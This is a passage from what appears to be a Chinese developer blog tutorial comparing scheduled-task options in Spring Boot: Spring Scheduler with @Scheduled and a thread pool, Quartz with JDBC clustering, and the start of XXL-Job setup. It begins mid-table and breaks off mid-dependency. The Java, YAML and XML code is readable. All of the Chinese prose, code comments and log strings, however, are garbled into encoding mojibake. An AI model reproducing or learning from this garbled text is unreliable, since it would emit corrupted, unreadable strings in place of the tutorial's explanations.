å†…ç½®Webç®¡ç†ç•Œé¢ï¼ˆä»»åŠ¡é…ç½®ã€æ‰§è¡Œæ—¥å¿—ã€ç›‘æ§å‘Šè­¦ï¼‰ï¼›3. æ”¯æŒåŠ¨æ€è°ƒæ•´ä»»åŠ¡ã€å¤±è´¥é‡è¯•ã€ä»»åŠ¡ä¾èµ–ï¼›4. æ”¯æŒåˆ†ç‰‡æ‰§è¡Œï¼ˆå¤§æ•°æ®é‡å¤„ç†ï¼‰</td><td>1. éœ€é¢å¤–éƒ¨ç½²è°ƒåº¦ä¸­å¿ƒï¼›2. è½»åº¦ä¾èµ–ä¸­é—´ä»¶ï¼ˆMySQLï¼‰ï¼›3. ç®€å•åœºæ™¯ç•¥æ˜¾é‡é‡çº§</td><td>åˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„ã€é«˜å¯ç”¨è¦æ±‚é«˜çš„æ ¸å¿ƒä¸šåŠ¡ä»»åŠ¡ï¼ˆå¦‚è®¢å•è¶…æ—¶å…³é—­ã€æŠ¥è¡¨ç”Ÿæˆï¼‰</td></tr></tbody></table>
<p>é€‰å‹å»ºè®®ï¼š 1. ç®€å•åœºæ™¯ï¼ˆå•æœºï¼‰ï¼šä¼˜å…ˆç”¨ Spring Schedulerï¼Œå¿«é€Ÿè½åœ°æ— æˆæœ¬ï¼› 2. å¤æ‚è°ƒåº¦ï¼ˆå•æœº/å°è§„æ¨¡é›†ç¾¤ï¼‰ï¼šç”¨ Quartzï¼Œå…¼é¡¾åŠŸèƒ½ä¸ç¨³å®šæ€§ï¼› 3. åˆ†å¸ƒå¼å¾®æœåŠ¡ï¼ˆå¤§è§„æ¨¡ã€é«˜å¯ç”¨ï¼‰ï¼šç”¨ XXL-Jobï¼Œè§£æ”¾è¿ç»´ä¸å¼€å‘æ•ˆç‡ã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€å®æˆ˜ï¼š3ç§æ–¹æ¡ˆçš„Spring Bootè½åœ°å®ç°</h3>
<p>ä¸‹é¢ç»“åˆSpring Bootï¼Œåˆ†åˆ«å®ç°3ç§æ–¹æ¡ˆçš„å®šæ—¶ä»»åŠ¡ï¼Œè¦†ç›–ä»ç®€å•åˆ°å¤æ‚çš„å…¨åœºæ™¯ã€‚</p>
<h4 data-id="heading-4">1. æ–¹æ¡ˆä¸€ï¼šSpring Schedulerï¼ˆå•æœºç®€å•ä»»åŠ¡ï¼‰</h4>
<p>Spring Scheduleræ˜¯Springæ¡†æ¶å†…ç½®çš„å®šæ—¶ä»»åŠ¡ç»„ä»¶ï¼Œæ— éœ€é¢å¤–å¼•å…¥ä¾èµ–ï¼Œæ³¨è§£å¼å¼€å‘å³å¯å¿«é€Ÿå®ç°ã€‚</p>
<h5 data-id="heading-5">ï¼ˆ1ï¼‰ç¯å¢ƒå‡†å¤‡ï¼šå¯ç”¨å®šæ—¶ä»»åŠ¡</h5>
<p>åœ¨Spring Bootä¸»ç±»ä¸Šæ·»åŠ  <code>@EnableScheduling</code> æ³¨è§£ï¼Œå¯ç”¨å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">SpringApplication</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">boot</span>.<span class="hljs-property">autoconfigure</span>.<span class="hljs-property">SpringBootApplication</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">scheduling</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">EnableScheduling</span>;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableScheduling</span> <span class="hljs-comment">// å¯ç”¨å®šæ—¶ä»»åŠ¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimedTaskDemoApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">TimedTaskDemoApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<h5 data-id="heading-6">ï¼ˆ2ï¼‰æ ¸å¿ƒå®ç°ï¼š@Scheduledæ³¨è§£ä½¿ç”¨</h5>
<p>åˆ›å»ºå®šæ—¶ä»»åŠ¡ç±»ï¼Œé€šè¿‡ <code>@Scheduled</code> æ³¨è§£å®šä¹‰ä»»åŠ¡æ‰§è¡Œè§„åˆ™ï¼Œæ”¯æŒ3ç§å¸¸è§æ—¶é—´é…ç½®ï¼šcronè¡¨è¾¾å¼ã€å›ºå®šé€Ÿç‡ã€å›ºå®šå»¶è¿Ÿã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.slf4j.MDC;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.Scheduled;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> java.util.UUID;

<span class="hljs-comment">/**
 * Spring Scheduler å®šæ—¶ä»»åŠ¡ç¤ºä¾‹
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleTimedTask</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(SimpleTimedTask.class);

    <span class="hljs-comment">/**
     * 1. cronè¡¨è¾¾å¼ï¼šæŒ‰æŒ‡å®šæ—¶é—´æ‰§è¡Œï¼ˆæ¯å¤©å‡Œæ™¨3ç‚¹æ¸…ç†è¿‡æœŸè®¢å•ï¼‰
     * cronè¯­æ³•ï¼šç§’ åˆ† æ—¶ æ—¥ æœˆ å‘¨ å¹´ï¼ˆå¹´å¯é€‰ï¼‰
     * ç¤ºä¾‹ï¼š0 0 3 * * ?  è¡¨ç¤ºæ¯å¤©03:00:00æ‰§è¡Œ
     */</span>
    <span class="hljs-meta">@Scheduled(cron = "0 0 3 * * ?")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanExpiredOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ‰‹åŠ¨ç»‘å®šrequestIdåˆ°MDCï¼Œä¾¿äºæ—¥å¿—è¿½è¸ªï¼ˆå‚è€ƒä¹‹å‰MDCåšå®¢å†…å®¹ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">requestId</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">"-"</span>, <span class="hljs-string">""</span>);
        MDC.put(<span class="hljs-string">"requestId"</span>, requestId);
        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"å¼€å§‹æ¸…ç†è¿‡æœŸè®¢å•"</span>);
            <span class="hljs-comment">// æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼šåˆ é™¤åˆ›å»ºæ—¶é—´è¶…è¿‡30åˆ†é’Ÿä¸”æœªæ”¯ä»˜çš„è®¢å•</span>
            <span class="hljs-comment">// orderMapper.deleteExpiredOrder(30); </span>
            log.info(<span class="hljs-string">"è¿‡æœŸè®¢å•æ¸…ç†å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"æ¸…ç†è¿‡æœŸè®¢å•å¤±è´¥"</span>, e);
        } <span class="hljs-keyword">finally</span> {
            MDC.clear(); <span class="hljs-comment">// æ¸…é™¤MDCï¼Œé¿å…çº¿ç¨‹å¤ç”¨æ±¡æŸ“</span>
        }
    }

    <span class="hljs-comment">/**
     * 2. å›ºå®šé€Ÿç‡ï¼šæŒ‰å›ºå®šæ—¶é—´é—´éš”æ‰§è¡Œï¼ˆæ¯éš”5ç§’æ‰“å°ç³»ç»Ÿæ—¶é—´ï¼‰
     * fixedRateï¼šä»¥ä¸Šä¸€æ¬¡ä»»åŠ¡å¼€å§‹æ—¶é—´ä¸ºåŸºå‡†ï¼Œé—´éš”å›ºå®šæ—¶é—´æ‰§è¡Œ
     */</span>
    <span class="hljs-meta">@Scheduled(fixedRate = 5000)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printSystemTime</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"å½“å‰ç³»ç»Ÿæ—¶é—´ï¼š{}"</span>, System.currentTimeMillis());
    }

    <span class="hljs-comment">/**
     * 3. å›ºå®šå»¶è¿Ÿï¼šæŒ‰å›ºå®šå»¶è¿Ÿæ‰§è¡Œï¼ˆä¸Šä¸€æ¬¡ä»»åŠ¡ç»“æŸåï¼Œé—´éš”å›ºå®šæ—¶é—´å†æ‰§è¡Œï¼‰
     * fixedDelayï¼šé€‚åˆä»»åŠ¡æ‰§è¡Œæ—¶é—´ä¸å›ºå®šçš„åœºæ™¯ï¼ˆå¦‚æ•°æ®åŒæ­¥ï¼Œæ‰§è¡Œæ—¶é—´å¯èƒ½æ³¢åŠ¨ï¼‰
     */</span>
    <span class="hljs-meta">@Scheduled(fixedDelay = 10000)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncThirdPartyData</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"å¼€å§‹åŒæ­¥ç¬¬ä¸‰æ–¹ç‰©æµæ•°æ®"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ¨¡æ‹ŸåŒæ­¥è€—æ—¶ï¼ˆ1-3ç§’ï¼‰</span>
            Thread.sleep((<span class="hljs-type">long</span>) (Math.random() * <span class="hljs-number">2000</span> + <span class="hljs-number">1000</span>));
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        log.info(<span class="hljs-string">"ç¬¬ä¸‰æ–¹ç‰©æµæ•°æ®åŒæ­¥å®Œæˆ"</span>);
    }
}
</code></pre>
<h5 data-id="heading-7">ï¼ˆ3ï¼‰å…³é”®é…ç½®ï¼šè‡ªå®šä¹‰çº¿ç¨‹æ± </h5>
<p>Spring Scheduleré»˜è®¤ä½¿ç”¨å•çº¿ç¨‹æ‰§è¡Œæ‰€æœ‰å®šæ—¶ä»»åŠ¡ï¼Œè‹¥å¤šä¸ªä»»åŠ¡åŒæ—¶è§¦å‘ï¼Œä¼šå¯¼è‡´ä»»åŠ¡é˜»å¡ï¼ˆä¸€ä¸ªä»»åŠ¡æ‰§è¡Œæ…¢ï¼Œåç»­ä»»åŠ¡æ’é˜Ÿï¼‰ã€‚å»ºè®®è‡ªå®šä¹‰çº¿ç¨‹æ± ï¼Œæé«˜ä»»åŠ¡å¹¶å‘èƒ½åŠ›ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.EnableAsync;
<span class="hljs-keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskScheduler;
<span class="hljs-keyword">import</span> java.util.concurrent.ThreadPoolExecutor;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAsync</span> <span class="hljs-comment">// å¯ç”¨å¼‚æ­¥æ‰§è¡Œï¼ˆå¯é€‰ï¼Œç»“åˆ@Asyncä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SchedulerConfig</span> {

    <span class="hljs-comment">/**
     * è‡ªå®šä¹‰å®šæ—¶ä»»åŠ¡çº¿ç¨‹æ± 
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ThreadPoolTaskScheduler <span class="hljs-title function_">taskScheduler</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ThreadPoolTaskScheduler</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskScheduler</span>();
        scheduler.setPoolSize(<span class="hljs-number">5</span>); <span class="hljs-comment">// æ ¸å¿ƒçº¿ç¨‹æ•°</span>
        scheduler.setThreadNamePrefix(<span class="hljs-string">"scheduler-thread-"</span>); <span class="hljs-comment">// çº¿ç¨‹åå‰ç¼€</span>
        scheduler.setAwaitTerminationSeconds(<span class="hljs-number">60</span>); <span class="hljs-comment">// ç­‰å¾…ä»»åŠ¡æ‰§è¡Œå®Œæˆçš„æ—¶é—´</span>
        scheduler.setWaitForTasksToCompleteOnShutdown(<span class="hljs-literal">true</span>); <span class="hljs-comment">// å…³é—­æ—¶ç­‰å¾…ä»»åŠ¡å®Œæˆ</span>
        scheduler.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()); <span class="hljs-comment">// æ‹’ç»ç­–ç•¥ï¼ˆè°ƒç”¨è€…æ‰§è¡Œï¼Œé¿å…ä»»åŠ¡ä¸¢å¤±ï¼‰</span>
        scheduler.initialize();
        <span class="hljs-keyword">return</span> scheduler;
    }
}
</code></pre>
<h4 data-id="heading-8">2. æ–¹æ¡ˆäºŒï¼šQuartzï¼ˆå¤æ‚è°ƒåº¦+é›†ç¾¤éƒ¨ç½²ï¼‰</h4>
<p>Quartzæ˜¯åŠŸèƒ½å¼ºå¤§çš„å¼€æºå®šæ—¶ä»»åŠ¡æ¡†æ¶ï¼Œæ”¯æŒå¤æ‚è°ƒåº¦è§„åˆ™ã€ä»»åŠ¡æŒä¹…åŒ–å’Œé›†ç¾¤éƒ¨ç½²ï¼Œé€‚åˆéœ€è¦â€œé«˜å¯é æ€§â€å’Œâ€œå¤æ‚è°ƒåº¦â€çš„åœºæ™¯ã€‚</p>
<h5 data-id="heading-9">ï¼ˆ1ï¼‰å¼•å…¥ä¾èµ–</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Quartzæ ¸å¿ƒä¾èµ– --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-comment">&lt;!-- æ•°æ®åº“ä¾èµ–ï¼ˆç”¨äºä»»åŠ¡æŒä¹…åŒ–ï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h5 data-id="heading-10">ï¼ˆ2ï¼‰é…ç½®Quartzï¼ˆapplication.ymlï¼‰</h5>
<p>é…ç½®Quartzçš„æ•°æ®æºï¼ˆä»»åŠ¡ä¿¡æ¯å­˜å…¥æ•°æ®åº“ï¼‰ã€çº¿ç¨‹æ± ã€é›†ç¾¤æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-comment"># æ•°æ®æºé…ç½®ï¼ˆä»»åŠ¡æŒä¹…åŒ–åˆ°MySQLï¼‰</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/quartz_db?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;allowPublicKeyRetrieval=true</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
  <span class="hljs-comment"># Quartzé…ç½®</span>
  <span class="hljs-attr">quartz:</span>
    <span class="hljs-attr">job-store-type:</span> <span class="hljs-string">JDBC</span> <span class="hljs-comment"># ä»»åŠ¡å­˜å‚¨æ–¹å¼ï¼šJDBCï¼ˆæŒä¹…åŒ–ï¼‰</span>
    <span class="hljs-attr">jdbc:</span>
      <span class="hljs-attr">initialize-schema:</span> <span class="hljs-string">NEVER</span> <span class="hljs-comment"># ä¸è‡ªåŠ¨åˆå§‹åŒ–è¡¨ç»“æ„ï¼ˆå»ºè®®æ‰‹åŠ¨æ‰§è¡ŒQuartzå®˜æ–¹SQLï¼‰</span>
    <span class="hljs-attr">properties:</span>
      <span class="hljs-attr">org:</span>
        <span class="hljs-attr">quartz:</span>
          <span class="hljs-attr">scheduler:</span>
            <span class="hljs-attr">instanceName:</span> <span class="hljs-string">quartzScheduler</span> <span class="hljs-comment"># è°ƒåº¦å™¨å®ä¾‹å</span>
            <span class="hljs-attr">instanceId:</span> <span class="hljs-string">AUTO</span> <span class="hljs-comment"># å®ä¾‹IDè‡ªåŠ¨ç”Ÿæˆï¼ˆé›†ç¾¤æ¨¡å¼å¿…é¡»ï¼‰</span>
          <span class="hljs-attr">threadPool:</span>
            <span class="hljs-attr">class:</span> <span class="hljs-string">org.quartz.simpl.SimpleThreadPool</span>
            <span class="hljs-attr">threadCount:</span> <span class="hljs-number">10</span> <span class="hljs-comment"># çº¿ç¨‹æ± å¤§å°</span>
            <span class="hljs-attr">threadPriority:</span> <span class="hljs-number">5</span> <span class="hljs-comment"># çº¿ç¨‹ä¼˜å…ˆçº§</span>
          <span class="hljs-attr">jobStore:</span>
            <span class="hljs-attr">class:</span> <span class="hljs-string">org.quartz.impl.jdbcjobstore.JobStoreTX</span> <span class="hljs-comment"># äº‹åŠ¡å‹å­˜å‚¨</span>
            <span class="hljs-attr">driverDelegateClass:</span> <span class="hljs-string">org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span> <span class="hljs-comment"># MySQL delegate</span>
            <span class="hljs-attr">tablePrefix:</span> <span class="hljs-string">QRTZ_</span> <span class="hljs-comment"># è¡¨å‰ç¼€ï¼ˆQuartzå®˜æ–¹è¡¨çš„é»˜è®¤å‰ç¼€ï¼‰</span>
            <span class="hljs-attr">isClustered:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># å¯ç”¨é›†ç¾¤æ¨¡å¼</span>
            <span class="hljs-attr">clusterCheckinInterval:</span> <span class="hljs-number">15000</span> <span class="hljs-comment"># é›†ç¾¤èŠ‚ç‚¹å¿ƒè·³é—´éš”ï¼ˆ15ç§’ï¼‰</span>
            <span class="hljs-attr">useProperties:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># ä¸ä½¿ç”¨å±æ€§æ–‡ä»¶å­˜å‚¨ä»»åŠ¡å‚æ•°</span>
</code></pre>
<h5 data-id="heading-11">ï¼ˆ3ï¼‰å®ç°Quartzä»»åŠ¡ï¼ˆJobï¼‰</h5>
<p>Quartzçš„ä»»åŠ¡éœ€å®ç° <code>Job</code> æ¥å£ï¼Œé‡å†™ <code>execute</code> æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.quartz.Job;
<span class="hljs-keyword">import</span> org.quartz.JobExecutionContext;
<span class="hljs-keyword">import</span> org.quartz.JobExecutionException;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.slf4j.MDC;
<span class="hljs-keyword">import</span> java.util.UUID;

<span class="hljs-comment">/**
 * Quartzä»»åŠ¡ï¼šç”Ÿæˆæ¯æ—¥é”€å”®æŠ¥è¡¨
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DailySalesReportJob</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Job</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(DailySalesReportJob.class);

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(JobExecutionContext context)</span> <span class="hljs-keyword">throws</span> JobExecutionException {
        <span class="hljs-comment">// ç»‘å®šMDCé“¾è·¯æ ‡è¯†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">requestId</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">"-"</span>, <span class="hljs-string">""</span>);
        MDC.put(<span class="hljs-string">"requestId"</span>, requestId);
        <span class="hljs-keyword">try</span> {
            log.info(<span class="hljs-string">"å¼€å§‹ç”Ÿæˆæ¯æ—¥é”€å”®æŠ¥è¡¨"</span>);
            <span class="hljs-comment">// æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼šæŸ¥è¯¢å‰ä¸€å¤©çš„é”€å”®æ•°æ®ï¼Œç”ŸæˆExcelæŠ¥è¡¨å¹¶å­˜å‚¨</span>
            <span class="hljs-comment">// String reportPath = salesReportService.generateDailyReport();</span>
            <span class="hljs-comment">// log.info("æ¯æ—¥é”€å”®æŠ¥è¡¨ç”Ÿæˆå®Œæˆï¼Œè·¯å¾„ï¼š{}", reportPath);</span>
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"ç”Ÿæˆæ¯æ—¥é”€å”®æŠ¥è¡¨å¤±è´¥"</span>, e);
            <span class="hljs-comment">// è‹¥ä»»åŠ¡å¤±è´¥ï¼Œå¯æŠ›å‡ºå¼‚å¸¸è§¦å‘é‡è¯•ï¼ˆéœ€é…ç½®é‡è¯•ç­–ç•¥ï¼‰</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JobExecutionException</span>(<span class="hljs-string">"æŠ¥è¡¨ç”Ÿæˆå¤±è´¥ï¼Œè§¦å‘é‡è¯•"</span>, e, <span class="hljs-literal">true</span>);
        } <span class="hljs-keyword">finally</span> {
            MDC.clear();
        }
    }
}
</code></pre>
<h5 data-id="heading-12">ï¼ˆ4ï¼‰é…ç½®ä»»åŠ¡è§¦å‘å™¨ï¼ˆTriggerï¼‰</h5>
<p>é€šè¿‡é…ç½®ç±»åˆ›å»ºJobDetailå’ŒTriggerï¼Œå®šä¹‰ä»»åŠ¡æ‰§è¡Œè§„åˆ™ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.quartz.*;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuartzJobConfig</span> {

    <span class="hljs-comment">/**
     * 1. å®šä¹‰JobDetailï¼ˆä»»åŠ¡è¯¦æƒ…ï¼‰
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> JobDetail dailySalesReportJobDetail() {
        <span class="hljs-keyword">return</span> JobBuilder.newJob(DailySalesReportJob.<span class="hljs-keyword">class</span>)
                .withIdentity(<span class="hljs-string">"dailySalesReportJob"</span>, <span class="hljs-string">"reportGroup"</span>) <span class="hljs-comment">// ä»»åŠ¡æ ‡è¯†ï¼ˆåç§°+ç»„åï¼‰</span>
                .storeDurably() <span class="hljs-comment">// ä»»åŠ¡å³ä½¿æ²¡æœ‰è§¦å‘å™¨ä¹ŸæŒä¹…åŒ–</span>
                .build();
    }

    <span class="hljs-comment">/**
     * 2. å®šä¹‰Triggerï¼ˆè§¦å‘å™¨ï¼‰ï¼šæ¯å¤©å‡Œæ™¨2ç‚¹æ‰§è¡Œ
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Trigger dailySalesReportTrigger() {
        <span class="hljs-comment">// è°ƒåº¦è§„åˆ™ï¼šæ¯å¤©02:00:00æ‰§è¡Œ</span>
        CronScheduleBuilder cronSchedule = CronScheduleBuilder.cronSchedule(<span class="hljs-string">"0 0 2 * * ?"</span>)
                .withMisfireHandlingInstructionDoNothing(); <span class="hljs-comment">// é”™è¿‡æ‰§è¡Œæ—¶é—´æ—¶ï¼Œä¸æ‰§è¡Œï¼ˆé¿å…é‡å¤æ‰§è¡Œï¼‰</span>

        <span class="hljs-keyword">return</span> TriggerBuilder.newTrigger()
                .forJob(dailySalesReportJobDetail()) <span class="hljs-comment">// ç»‘å®šä»»åŠ¡</span>
                .withIdentity(<span class="hljs-string">"dailySalesReportTrigger"</span>, <span class="hljs-string">"reportGroup"</span>) <span class="hljs-comment">// è§¦å‘å™¨æ ‡è¯†</span>
                .withSchedule(cronSchedule) <span class="hljs-comment">// ç»‘å®šè°ƒåº¦è§„åˆ™</span>
                .build();
    }
}
</code></pre>
<h4 data-id="heading-13">3. æ–¹æ¡ˆä¸‰ï¼šXXL-Jobï¼ˆåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼‰</h4>
<p>XXL-Jobæ˜¯å›½å†…å¼€æºçš„åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼ŒåŸºäºâ€œè°ƒåº¦ä¸­å¿ƒ+æ‰§è¡Œå™¨â€æ¶æ„ï¼Œæä¾›Webç®¡ç†ç•Œé¢ã€ä»»åŠ¡ç›‘æ§ã€å¤±è´¥é‡è¯•ã€åˆ†ç‰‡æ‰§è¡Œç­‰åŠŸèƒ½ï¼Œæ˜¯åˆ†å¸ƒå¼å¾®æœåŠ¡æ¶æ„çš„é¦–é€‰æ–¹æ¡ˆã€‚</p>
<h5 data-id="heading-14">ï¼ˆ1ï¼‰éƒ¨ç½²è°ƒåº¦ä¸­å¿ƒ</h5>
<ol>
<li>ä»XXL-Jobå®˜ç½‘ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.xuxueli.com%2Fxxl-job%2F%25EF%25BC%2589%25E4%25B8%258B%25E8%25BD%25BD%25E6%25BA%2590%25E7%25A0%2581%25EF%25BC%258C%25E6%2589%25A7%25E8%25A1%258C%25E6%25BA%2590%25E7%25A0%2581%25E4%25B8%25AD" target="_blank" title="https://www.xuxueli.com/xxl-job/%EF%BC%89%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%A7%E8%A1%8C%E6%BA%90%E7%A0%81%E4%B8%AD" ref="nofollow noopener noreferrer">www.xuxueli.com/xxl-job/ï¼‰ä¸‹è½½â€¦</a> <code>doc/db/tables_xxl_job.sql</code> SQLæ–‡ä»¶ï¼Œåˆ›å»ºè°ƒåº¦ä¸­å¿ƒæ•°æ®åº“ï¼› 2. ä¿®æ”¹è°ƒåº¦ä¸­å¿ƒé…ç½®æ–‡ä»¶ï¼ˆ<code>xxl-job-admin/src/main/resources/application.properties</code>ï¼‰ï¼Œé…ç½®æ•°æ®åº“è¿æ¥ï¼› 3. å¯åŠ¨è°ƒåº¦ä¸­å¿ƒï¼ˆSpring Bootåº”ç”¨ï¼‰ï¼Œè®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8080%2Fxxl-job-admin%25EF%25BC%258C%25E9%25BB%2598%25E8%25AE%25A4%25E8%25B4%25A6%25E5%258F%25B7%25E5%25AF%2586%25E7%25A0%2581%25EF%25BC%259Aadmin%2F123456%25E3%2580%2582" target="_blank" title="http://localhost:8080/xxl-job-admin%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9Aadmin/123456%E3%80%82" ref="nofollow noopener noreferrer">http://localhost:8080/xxl-job-adminï¼Œé»˜è®¤è´¦å·å¯†ç ï¼šadmin/123456ã€‚</a></li>
</ol>
<h5 data-id="heading-15">ï¼ˆ2ï¼‰é›†æˆæ‰§è¡Œå™¨ï¼ˆSpring Booté¡¹ç›®ï¼‰</h5>
<h6 data-id="heading-16">â‘  å¼•å…¥ä¾èµ–</h6>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- XXL-Jobæ‰§è¡Œå™¨ä¾èµ– --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.xuxueli<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xxl-job-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
